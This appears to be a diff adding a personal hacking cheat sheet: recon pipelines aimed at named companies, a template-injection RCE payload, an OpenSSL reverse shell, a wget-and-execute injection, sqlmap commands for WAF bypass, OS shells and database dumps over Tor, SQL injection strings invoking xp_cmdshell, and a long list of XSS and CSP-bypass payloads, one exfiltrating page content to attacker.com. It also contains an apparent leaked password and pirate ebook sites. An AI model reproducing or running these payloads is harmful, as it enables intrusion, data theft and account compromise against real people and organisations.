@@ -1,0 +1,388 @@
+assetfinder -subs-only http://paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
+
+rush -j100 -i bitquark-subdomains-top100000.txt 'curl -s -L "https://dns.google.com/resolve?name{}.tesla.com&type=A&cd=true" | sed "s#\"#\n#g;s# #\n#g" | grep "tesla"' | sed 's#\.$##g' | anew teslaDomains 
+
+rush -i /opt/recon/xxx/hostsAlive -j 10 'ffuf -o $(echo {} | unfurl domains) -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -u "{}/FUZZ" -sf -ignore-body -mc 200 -t 300'
+
+shodan domain http://sony.com | awk '{print $3}' | httpx -silent | rush -j 3 'python3 http://smuggler.py -u {}'
+
+shodan domain TARGET | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
+
+shodan domain http://sony.com | awk '{print $1}' | httpx -silent | xargs -I@ sh -c 'ffuf -w fuzz-Bo0oM.txt -u @/FUZZ -replay-proxy http://192.168.15.28:8080 -t 10 -mc 200'
+
+shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | parallel -I% -j 100 'curl -s http://%/ajax/render/PAYLOAD" | grep VULN 
+
+chaos -silent -d http://paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -silent -title| tr "[]" " "
+
+chaos -d http://att.com -silent | httpx -silent | anew domains | rush 'subjack -w {} -t 100 -timeout 30 -ssl -c fingerprints.json -v 3' >> takeover
+
+curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
+
+curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew'm
+
+curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path path -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew 
+
+wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
+
+wget -nv -nc https://chaos-data.projectdiscovery.io/playstation.zip ; unzip http://playstation.zip ; cat *.txt | httpx -silent -threads 300 | anew fullAlive; gospider -a -d 0 -S fullAlive -c 5 -t 100 -d 5 --blacklist black | egrep -o '(http|https)://[^/"]+' | anew httpSpider 
+
+wget https://chaos-data.projectdiscovery.io/lime.zip -nv ; unzip http://lime.zip ; cat *.txt >> lime.txt ; cat lime.txt | httpx -silent -threads 200 | gau -subs -retries 2| anew | rush -j 3 'jaeles scan -s /jaeles-signatures/ -u {}'
+
+findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
+
+
+
+dnscmd <ServerName> /Config /NoRecursion {1|0}
+q5MmE8;2X'877q=g9MjzfB@4NAZ[Nw8K
+RD /S /Q %SystemDrive%\windows.old 
+
+$env:Path += ";C:\Python27\Scripts"
+
+SEarch
+https://securityheaders.io/
+https://www.social-searcher.com/
+http://sanddroid.xjtu.edu.cn:8080/
+https://b-ok.org/
+https://www.pdfdrive.com/
+http://www.allitebooks.org/
+
+RCE
+%23set($x=%27%27)
++%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))
++%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27))
++$ex.waitFor()+%23set($out=$ex.getInputStream())
++%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
+
+curl -fsSI "https://web.archive.org/save/<url>" | grep content-location | awk '{printf ("https://web.archive.org%s\n", $2)}'
+
+head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '
+
+
+Best Temporary mailbox (Updates)🔰
+➖https://www.guerrillamail.com/en/
+➖https://10minutemail.com
+➖https://www.trash-mail.com/inbox/
+➖https://www.mailinator.com
+➖http://www.yopmail.com/en
+➖https://generator.email
+➖https://en.getairmail.com
+➖http://www.throwawaymail.com/en
+➖https://maildrop.cc
+➖https://owlymail.com/en
+➖https://www.moakt.com
+➖https://tempail.com
+➖http://www.yopmail.com
+➖https://temp-mail.org/en
+➖https://www.mohmal.com 👍🏻 Best options
+➖ http://od.obagg.com 👍🏻 Best options
+➖http://onedrive.readmail.net 👍🏻 Best options
+➖http://xkx.me 👍🏻 Best options
+➖ https://t.odmail.cn 👍🏻 ( you can register email from Microsoft and get 5TB onedrive Office365 )
+➖ https://www.emailondeck.com
+➖ https://smailpro.com
+➖ https://anonbox.net
+➖ https://M.kuku.lu
+
+
+
+curl -v -H “Authorization: Bearer <jwt_token>” https://<master_ip>:<port>/api/v1/namespaces/default/pods/
+/default/secrets/
+/default/deployments
+/default/daemonsets
+
+The Best website for Download Ebook🔰
+
+Ⓜ️ 
+
+◾️PDFdrive : https://www.pdfdrive.com 
+◾️ b-ok.cc : https://b-ok.cc/
+◾️ b-ok2.org :  https://b-ok2.org/
+◾️ booksc : https://booksc.xyz/
+◾️ AudioBook :  http://audiobookbay.nl
+◾️ Library Genesis2M : http://gen.lib.rus.ec
+◾️ https://sanet.st/
+◾️ https://libgen.me/
+◾️ http://bookfi.net/
+◾️ https://ebookpdf.com
+
+
+
+python sqlmap.py -u
+"http://localhost/storefrontB2CWEB/cart.do?action=cart_add&itm_id=1"
+-p itm_id --dbms=mssql --level=5 --risk=3
+--tamper=between,space2comment -o --random-agent --parse-errors
+--os-shell --technique=ES
+
+
+
+Reverse SSL shell openssl - @ThemsonMester
+
+gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt
+
+mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <HOST>:<PORT> > /tmp/s; rm /tmp/s
+
+===========Linux Command Privilege Escalation Exploit================
+uname \"$(bash -c \\\"$(wget http://example.com/file )\\\")\"
+
+nmap --script http-slowloris-check 
+
+nmap -sV --script=banner --script ssl-enum-ciphers --script http-slowloris-check  --script smb-enum-shares.nse --script ssl-dh-params
+nmap -sV -vv -Pn --script ssl-enum-ciphers --script ssl-dh-params --script ssl-poodle --script=sslv2-drown --script ssl-heartbleed --script rsa-vuln-roca
+nmap -sV --script=http-php-version 
+nmap --script http-webdav-scan -p80,8080 <target>
+nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80
+nmap --script dns-brute www.foo.com
+nmap -p80 --script http-iis-short-name-brute <target>
+nmap -sV --script http-vuln-cve2015-1635 --script-args uri='/anotheruri/' >>Remote Code Execution in HTTP.sys (MS15-034)
+nmap --script smb-vuln-ms17-010.nse
+nmap --script=http-waf-fingerprint <targets>
+nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 <targets>
+nmap -p80 --script http-waf-detect <host>
+nmap --script firewall-bypass <target>
+nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 <target>
+nmap --script=http-traceroute <targets>
+nmap --script http-open-proxy.nse --script-args proxy.url=<url>,proxy.pattern=<pattern>
+
+nmap -sV -PN -p443 --script http-xssed.nse --script http-stored-xss.nse --script http-dombased-xss.nse --script=http-unsafe-output-escaping --script=http-sql-injection --script http-rfi-spider --script http-csrf.nse --script http-security-headers --script http-enum --script http-title --script ssl-ccs-injection --script http-shellshock --script http-cookie-flags.nse --script http-cors.nse --script http-enum.nse --script http-errors.nse --script http-exif-spider.nse --script http-fileupload-exploiter.nse --script http-form-brute.nse --script http-form-fuzzer.nse --script http-frontpage-login.nse --script http-iis-webdav-vuln.nse --script http-internal-ip-disclosure.nse --script http-open-redirect.nse --script http-malware-host.nse --script http-phpself-xss.nse --script http-phpmyadmin-dir-traversal.nse --script http-php-version.nse --script http-robots.txt.nse --script http-server-header.nse --script http-userdir-enum.nse --script http-waf-detect.nse --script http-waf-fingerprint.nse --script http-xssed.nse --script ssl-enum-ciphers.nse --script ssl-heartbleed.nse --script ssl-poodle.nse --script sslv2-drown.nse --script whois-domain.nse --script dns-fuzz.nse --script http-aspnet-debug.nse --script http-auth-finder.nse --script http-auth.nse --script http-backup-finder.nse www6.cmcinfosec.com
+
+
+=======================SQLMAP Bypass Waf=====================================
+
+--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+--dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
+--dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
+sqlmap -u http://www.********?id=1 --level 2 --risk 3 --batch --dbs
+ 
+-f -b --current-user --current-db --is-dba --users --dbs
+ 
+--risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+ 
+--risk 3 --level 5 --random-agent --proxy http://123.57.48.140:8080 --dbs
+ 
+--random-agent --dbms=MYSQL --dbs --technique=B"
+ 
+--identify-waf --random-agent -v 3 --dbs
+ 
+1 : --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
+2 : --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3
+ 
+--threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump
+ 
+--tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent
+ 
+sqlmap.py -u http://192.168.0.107/test.php?id=1 -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"
+ 
+--banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2
+-v3 --dbms="MySQL" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent -D damksa_abr -T admin,jobadmin,member --colu
+ 
+C:\Python27\python.exe sqlmap.py --wizard
+ 
+--level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
+ 
+ 
+sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql
+ 
+sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
+ 
+ 
+sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
+ 
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent
+ 
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" --tables
+ 
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns
+ 
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump
+
+============================================================================
+
+========================SQL injection ===============================================
+
+MYSQL INJECTION - BYPASS UNION SELECT (WAF)
+WHAT IS BYPASS : when target having WAF (web application firewall) secure encption or security on there server its cannot be directly get any vulnerble columns or its cannot be injeCted! so there haCker try to put diffrent query in combined charachaters encrpted,encoded,modifyed sql query parameters like one called UNION SELECT or UNION ALL SELECT!
+there is all types of waf bypass method for bypass union select!
+%55nion(%53elect 1,2,3)-- -
++union+distinct+select+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
++#union+#select
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
+/*!u%6eion*//*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+%2f**%2funion%2f**%2fselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union(/*!/**/SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/**/union/**/select/**/
+/**/uNIon/**/sEleCt/**/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*//*!SelECt*/
++union+distinct+select+
++union+distinctROW+select+
+uNiOn aLl sElEcT
++union+select+1,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(user)WHERE(@x)IN(@x:=CONCAT(0x20,@x,user,0x203a3a20,pass,0x3c62723e))))x),3,4,5,6,7,8--+-
+0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z
+
+b"action=challenge&user=" + args.user.encode('utf-8') + b"' AND
+user_password LIKE \'" + temp_pass.encode('utf-8') + b"%' AND
+substr(user_password,1," + str(temp_pass_len).encode('utf-8') + b") = '" +
+temp_pass.encode('utf-8') + b"'--")
+
+login =
+'{"type":"request","message":{"transactionid":"123456789zxa","action":"login","username":"'
++ username + '\' AND LENGTH(user_password)==' + str(length) + ' AND
+88=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(500000000/2)))) or
+\'1\'=\'2","token":"lolwat"}}'
+33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'
+
+
+==========================================================================
+
+https://mrc.fecredit.com.vn/
+
+pass shinji: 3RKE^8ao#0Rbh8#BD9P(NcEU
+
+
+java -jar <jar-file-name>.jar
+
+xss
+========================
+javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+javascript://comment%0a%0dalert(0);
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+<input onfocus="alert(0);" autofocus>
+onload=\"a='aler';d='XSS';b='t('+d+')';c=a+b;console.log(eval(c));
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+Angular JS short vector by @garethheyes 
+{{$eval.constructor('alert(1)')()}}
+
+Even shorter by @LewisArdern
+{{$on.constructor('alert(1)')()}}
+
+<object/onerror=write`1`//
+<output name="jAvAsCriPt://&NewLine;\u0061ler&#116(1)" onclick="eval(name)">X</output>
+CSP Bypass by @Rhynorater
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://rhy.xss.ht ";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+CSP Bypass by @Rhynorater
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://rhy.xss.ht ";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+<svg/onload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;//
+<!--*/!'*/!>%0D<svg/onload=confirm`1`//
+
+Incapsula WAF bypass by @daveysec 
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+
+// Gareth Heyes - https://twitter.com/garethheyes
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>
+
+// clrf -  http://polyglot.innerht.ml/
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=document.location=`//localhost/mH`//>
+<iframe/onload="var b = 'document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a">
+
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
+<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
+
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+<svg/whatthe=""onload=alert(45)>
+%60%7D%2b%22%2balert(1337);x=%60%7D%7B(class%20$%7By=%60
+
+"><script src=data:text/javascript;base64,ZD1kb2N1bWVudDsgXyA9IGQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7Xy5pZD0nMTknO18ubm9uY2U9ZC5xdWVyeVNlbGVjdG9yKCdbbm9uY2VdJykubm9uY2U7Xy5zcmM9Jy8vbG9jYWxob3N0L20nO2QuYm9keS5hcHBlbmRDaGlsZChfKSA=></script>
+
+"><script src='https://domain'></script>
+
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
+"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
+
+<form><button formaction=javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`));//
+
+
+Imperva WAF Bypass for XSS;
+<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
+- without parentheses, 'alert', 'document.domain' , 'window' , space
+"<svg/onload=alert(1)>"@x.y
+javascript://%250Aalert(1)
+javascript://%250A1?alert(1):0
+" formaction=java%26Tab%3bscript:ale%26Tab%3brt() type=image src=""
+javascript://%250Aalert(1)//?1
+javascript://https://domain.com/%250A1?alert(1):0
+12345678901<svg onload=alert(1)>
+\'-alert(1)//
+'-alert(1)-'
+
+with (l33t()) {
+  c0ns0l3.w4rn('l33t');
+  al3rt('w00t');
+}
+
+function l33t(p=this){return new Proxy(p,{has:()=>!0,get:(t,n)=>(p=Reflect.get(t,String(n).replace(/\d/g,a=>'oizeasGtBg'[a])))?p.apply?p.bind(t):l33t(p):p})}
+
+<svg onload='alert(1)'/>
+
+<input autofocus onfocus=alert(1)>
+
+<video><source onerror="JavaScript:alert(1)">
+
+<marquee onstart=alert(1)>
+
+window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1)
+<+!-<script/src+=+\\//\\http://14.rs \\//\\+></script/src>->
+<script>eval('al'+'ert(1)');</script>  
+<script>'alert(1)'.replace(/.+/,eval)</script>
+<img onerror=eval('al\u0065rt(1)') src=a>
+<script>function::['alert'](1)</script>
+
+Wordfence 7.4.2
+<a href=&#01javascript:alert(1)>
+
+Sucuri CloudProxy (POST only)
+<a href=javascript&colon;confirm(1)>
+
+ModSecurity CRS 3.2.0 PL1
+<a href="jav%0Dascript&colon;alert(1)">
+
+"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain="})))}catch (e) { d = document; d.location.hash.match(`x1`) ? `` : d.location=`//localhost/mH`}//' allowscriptaccess=always>
+
+"><object data='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch (e) { d = document; d.location.hash.match(`x1`) ? `` : d.location=`//localhost/mH`}//' allowscriptaccess=always>
+
+"><base href="//domain">
+<script nonce='secret' src='./scripts/foo.js'></script>
+
+"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
+
+<script>$.getScript("//domain")</script>
+"><script src="//domain/xss.js"></script>
+"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>
+javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)');
+"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>
+"><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
+"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>
+"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')"> 
+"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>
+"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">
+"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">
+"><script src=//analytics.twitter.com/tpm?tpm_cb=alert(document.domain)>//
+<script>alert(1)//
+<script>alert(1)<!--
+<script>alert(1)%0A-->
+<script src=data:,alert(1)>
+<script src=//HOST/FILE>
+<script src=https:DOMAIN/FILE>
+<svg><script xlink:href=//HOST/FILE>
+<svg><script xlink:href=https:DOMAIN/FILE>
+javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/
++/onmouseover=1/+/[*/[]/+alert(/
+@PortSwiggerRes
+/)//'>
